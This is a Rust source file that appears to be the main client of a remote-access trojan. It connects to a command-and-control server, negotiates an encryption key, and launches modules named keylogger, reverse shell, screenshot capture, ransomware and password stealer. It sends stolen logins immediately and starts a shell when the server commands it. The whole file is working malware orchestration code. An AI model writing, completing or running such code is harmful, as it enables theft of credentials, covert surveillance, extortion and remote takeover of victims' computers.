use ransomware::ransom_handler;
use tokio::{io::{AsyncReadExt, AsyncWriteExt}, net::{tcp::OwnedWriteHalf, TcpStream}, sync::{mpsc, Mutex}};
use std::{collections::HashMap, ops::DerefMut, sync::Arc};
use aes_gcm::{aead::{Aead, KeyInit},Aes256Gcm };
use tokio::sync::watch;

use keylogger::KeyLog;
use shared::{acquire_key, ControlCode, ControlPacket, DataPacket, ModuleType, PacketType, StatusType, C2_ADDRESS};

mod keylogger;
mod reverse_shell;
mod capture;
mod ransomware;
mod pasw_stealer;

struct ModuleSync {
    data_recieve: Option<mpsc::Receiver<Vec<u8>>>,
    data_send: Option<mpsc::Sender<Vec<u8>>>,
    status_send: watch::Sender<StatusType>,
    status_recieve: watch::Receiver<StatusType>,
}

impl ModuleSync {
    fn new_with_mpsc() -> Self {
        let (msx, mrx) = mpsc::channel(256);
        let (wsx, wrx) = watch::channel(StatusType::Stopped);
        Self {
            data_recieve: Some(mrx),
            data_send: Some(msx),
            status_send: wsx,
            status_recieve: wrx,
        }
    }

    fn new() -> Self {
        let (wsx, wrx) = watch::channel(StatusType::Stopped);
        Self {
            data_recieve: None,
            data_send: None,
            status_send: wsx,
            status_recieve: wrx,
        }
    }

    fn take_reciever(&mut self) -> Option<mpsc::Receiver<Vec<u8>>> {
        self.data_recieve.take()
    }
}



#[tokio::main]
async fn main() -> std::io::Result<()>{
    let server = TcpStream::connect(C2_ADDRESS).await?;

    let (mut stream_read, mut stream_write) = server.into_split();

    // diffie-hellman key exchange so c2 and client can used a symetric cipher
    let key = acquire_key(&mut stream_read, &mut stream_write).await?;
    let stream_write: Arc<Mutex<OwnedWriteHalf>> = Arc::new(Mutex::new(stream_write)); 

    //contruct sync related items
    let mut active_modules: HashMap::<ModuleType, ModuleSync> = HashMap::new();

    let keylogger_sync = ModuleSync::new();
    let mut reverse_shell_sync = ModuleSync::new_with_mpsc();
    let capture_sync = ModuleSync::new();
    let mut ransomware_sync = ModuleSync::new_with_mpsc();
    let pasw_stealer_sync = ModuleSync::new();


    // create associated module structs
    let keylogger = Arc::new(KeyLog {
        stream: stream_write.clone(),
        hookid: None,
        notifier: keylogger_sync.status_send.clone(),
        key
    });

    
    let reverse_shell = reverse_shell::ShellManager {
        stream_write: stream_write.clone(),
        stream_read: Arc::new(Mutex::new(reverse_shell_sync.take_reciever().unwrap())),
        status: reverse_shell_sync.status_send.clone(),
        key
    };

    let pasw_stealer = pasw_stealer::PaswStealer {
        stream_write: stream_write.clone(),
        key,
        notifier: pasw_stealer_sync.status_send.clone()
    };



    let ransom_write = stream_write.clone();
    let mut recv = ransomware_sync.take_reciever().unwrap();
    tokio::spawn( async move {
        match ransom_handler(ransom_write.clone(),&mut recv, key).await {
            Ok(_) => (),
            Err(e) => println!("error on ransom: {}", e)
        }

    });

    if let Ok(screenshot) = capture::Screenshot::new(stream_write.clone(),key, capture_sync.status_send.clone()) {
        active_modules.insert(ModuleType::Capture, capture_sync);
        tokio::spawn(async move {
            screenshot.process_screenshots().await.unwrap();
        });
    }

    // add modules used to hashmap that is used to filter data recieved from c2 to the correct module
    active_modules.insert(ModuleType::ReverseShell, reverse_shell_sync);
    active_modules.insert(ModuleType::KeyLogger, keylogger_sync);
    active_modules.insert(ModuleType::RansomWare, ransomware_sync);
    active_modules.insert(ModuleType::PaswStealer, pasw_stealer_sync);

    let mut loaded_modules: [u8; 32] = [255; 32];
    for module in active_modules.keys() {
        loaded_modules[*module as usize] = *module as u8
    }
    stream_write.lock().await.deref_mut().write(&loaded_modules).await?;


    keylogger::start(keylogger);

    tokio::spawn(async move {
        pasw_stealer.send_logins().await?;
        Ok::<(), std::io::Error>(())
    });
    
    // use aes256 cipher from created key
    let cipher = Aes256Gcm::new(&key.into());

    // loop listening to messages from c2
    loop {
        let mut buf = [0; 2056];
        let _amount_read = stream_read.read(&mut buf).await?;
        let nonce = &buf[0..12];
        let length = usize::from_be_bytes(buf[12..20].try_into().unwrap());
        let ciphertext = &buf[20..length+20];
        let plaintext = cipher.decrypt(nonce.into(), ciphertext).unwrap();
        let packet_type: PacketType = plaintext[0].try_into().unwrap();
        match packet_type {
            PacketType::Data => {
                match DataPacket::from_bytes(&plaintext[1..]) {
                    Ok(payload) => {
                        match active_modules.get(&payload.module_type) {
                            Some(mod_sync) => {
                                mod_sync.data_send.as_ref().unwrap().send(payload.data).await.unwrap();
                            }
                            None => {
                                println!("No Module found for recieved packet")
                            }
                        }
                    }
                    Err(e) => {
                        println!("Error converting to payload: {}", e)
                    }
                }
            }
            PacketType::Control => {
                match ControlPacket::from_bytes(&plaintext[1..]) {
                    Ok(payload) => {
                        match payload.module_type {
                            ModuleType::ReverseShell => {
                                match payload.control_code {
                                    ControlCode::Start => {
                                        if active_modules.get(&ModuleType::ReverseShell).is_some() {
                                            if *active_modules.get(&ModuleType::ReverseShell).unwrap().status_recieve.borrow() as u8 == StatusType::Stopped as u8 {
                                                println!("got control code to start shell");
                                                reverse_shell.start_shell().await?;
                                            }
                                        }
                                    }
                                    ControlCode::Stop => ()
                                }
                            },
                            _ => ()
                        }
                    }
                    Err(e) => {
                        println!("Error converting to payload: {}", e)
                    }
                }
            }
        }


    }

}